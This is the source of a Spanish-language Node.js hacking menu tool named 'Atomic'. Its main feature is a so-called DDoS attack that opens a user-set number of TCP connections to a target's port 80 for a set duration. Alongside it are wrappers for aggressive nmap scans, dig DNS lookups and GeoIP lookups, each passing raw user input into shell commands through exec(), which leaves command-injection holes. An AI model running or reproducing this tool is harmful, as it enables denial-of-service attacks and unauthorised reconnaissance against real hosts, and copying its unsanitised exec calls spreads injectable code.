const net = require('net');
const rl = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});
const axios = require('axios');
const lolcatjs = require('lolcatjs');
const figlet = require("figlet");
const { exec } = require('child_process');

lolcatjs.options = { 
    seed: Math.round(Math.random() * 1000),
    colors: true
};

let numConnections = 100;
let attackDuration = 60;

const ddosAttack = async (url, connections, duration) => {
    try {
        console.log(`\nIniciando ataque DDoS a ${url}`);
        const sockets = [];
        
        for (let i = 0; i < connections; i++) {
            const socket = new net.Socket();
            socket.connect(80, url);
            socket.on('error', () => {});
            sockets.push(socket);
        }

        setTimeout(() => {
            sockets.forEach(socket => socket.destroy());
            console.log('\nAtaque finalizado');
            showMenu();
        }, duration * 1000);
    } catch (error) {
        console.error(`Error: ${error}`);
        showMenu();
    }
};

const updateCode = () => {
    exec('git pull origin main', (error) => {
        console.log(error ? `Error: ${error}` : 'Código actualizado correctamente!');
        showMenu();
    });
};

const getInfo = (ip) => {
    exec(`dig +nocmd ${ip} any +multiline`, (error, stdout) => {
        if (error) return console.error(`Error: ${error.message}`);
        
        const result = stdout.split('\n').filter(line => 
            !line.startsWith(';') && line.trim() !== ''
        ).map(line => {
            const parts = line.trim().split(/\s+/);
            const type = parts[3];
            const ttl = parts[1];
            const value = parts.slice(4).join(' ');
            
            return `  ${type} Record: ${value} (TTL: ${ttl}s)`;
        }).join('\n');
        
        console.log(`DNS Information for ${ip}:\n${result}`);
        showMenu();
    });
};

const analyzeIP = (target) => {
    exec(`nmap -A -T4 ${target}`, (error, stdout) => {
        if (error) return console.error(`Error: ${error.message}`);
        
        const openPorts = stdout.match(/^(\d+\/tcp)\s+(\w+)\s+(\S+)(?:\s+(.+))?$/gm) || [];
        const osMatch = stdout.match(/OS:\s*(.+)/);
        const serviceMatch = stdout.match(/Service Info:\s*([\s\S]+?)(?=\n\n|$)/);
        
        console.log(`\nNmap scan report for ${target}`);
        console.log("PORT     STATE SERVICE    VERSION");
        openPorts.forEach(port => console.log(port));
        if (osMatch) console.log(`\nOS: ${osMatch[1]}`);
        if (serviceMatch) console.log(`\nService Info:\n${serviceMatch[1]}`);
        showMenu();
    });
};

const getGeoIP = async (ip) => {
    try {
        const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
        
        figlet.text("GeoIP", (err, banner) => {
            if (!err) lolcatjs.fromString(banner);
            console.log('');
            
            const fields = [
                `〔1〕IP: ${data.query}`, `〔2〕Estatus: ${data.status}`,
                `〔3〕País: ${data.country} (${data.countryCode})`,
                `〔4〕Región: ${data.regionName}`, `〔5〕Ciudad: ${data.city}`,
                `〔6〕ISP: ${data.isp}`, `〔7〕AS: ${data.as} (${data.asname})`,
                `〔8〕Lat/Lon: ${data.lat}, ${data.lon}`, 
                `〔9〕Zona horaria: ${data.timezone}`
            ];
            
            fields.forEach(field => lolcatjs.fromString(field));
            showMenu();
        });
    } catch (error) {
        console.error(`Error: ${error.message}`);
        showMenu();
    }
};

const showMenu = () => {
    console.clear();
    figlet.text("Atomic", (err, banner) => {
        if (!err) lolcatjs.fromString(banner);
        
        lolcatjs.fromString('「Desarrollado por Keiji821」\n');
        [
            '〔1〕Iniciar ataque DDoS',
            '〔2〕Actualizar código',
            '〔3〕Configurar conexiones simultáneas',
            '〔4〕Configurar duración del DDoS',
            '〔5〕Información de DNS',
            '〔6〕Análisis de IP',
            '〔7〕Información geográfica',
            '\n〔0〕Salir\n'
        ].forEach(line => lolcatjs.fromString(line));
        
        rl.setPrompt('｢🎐｣➤ ');
        rl.prompt();
    });
};

rl.on('line', (input) => {
    const option = input.trim();
    
    const actions = {
        '1': () => {
            rl.question('URL/IP: ', url => {
                if (!url) return console.log('URL inválida');
                ddosAttack(url, numConnections, attackDuration);
            });
        },
        '2': updateCode,
        '3': () => {
            rl.question('Conexiones: ', num => {
                numConnections = parseInt(num) || numConnections;
                console.log(`Conexiones: ${numConnections}`);
                showMenu();
            });
        },
        '4': () => {
            rl.question('Duración (s): ', time => {
                attackDuration = parseInt(time) || attackDuration;
                console.log(`Duración: ${attackDuration}s`);
                showMenu();
            });
        },
        '5': () => {
            rl.question('IP: ', ip => {
                if (!ip) return console.log('IP inválida');
                getInfo(ip);
            });
        },
        '6': () => {
            rl.question('IP/Dominio: ', target => {
                if (!target) return console.log('Entrada inválida');
                analyzeIP(target);
            });
        },
        '7': () => {
            rl.question('IP/Dominio: ', ip => {
                if (!ip) return console.log('Entrada inválida');
                getGeoIP(ip);
            });
        },
        '0': () => {
            console.log('Saliendo...');
            process.exit();
        }
    };
    
    actions[option] ? actions[option]() : console.log('Opción inválida');
});

showMenu();